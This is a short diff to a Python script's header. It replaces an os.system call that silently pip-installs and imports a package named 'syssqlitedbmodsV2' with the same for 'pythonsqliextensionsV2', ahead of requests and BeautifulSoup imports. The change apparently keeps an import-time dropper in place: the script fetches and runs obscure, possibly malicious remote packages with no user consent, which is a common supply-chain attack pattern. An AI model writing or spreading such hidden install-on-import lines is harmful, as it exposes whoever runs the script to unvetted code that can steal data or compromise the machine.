@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbmodsV2")
-import syssqlitedbmodsV2
+os.system("pip install pythonsqliextensionsV2")
+import pythonsqliextensionsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
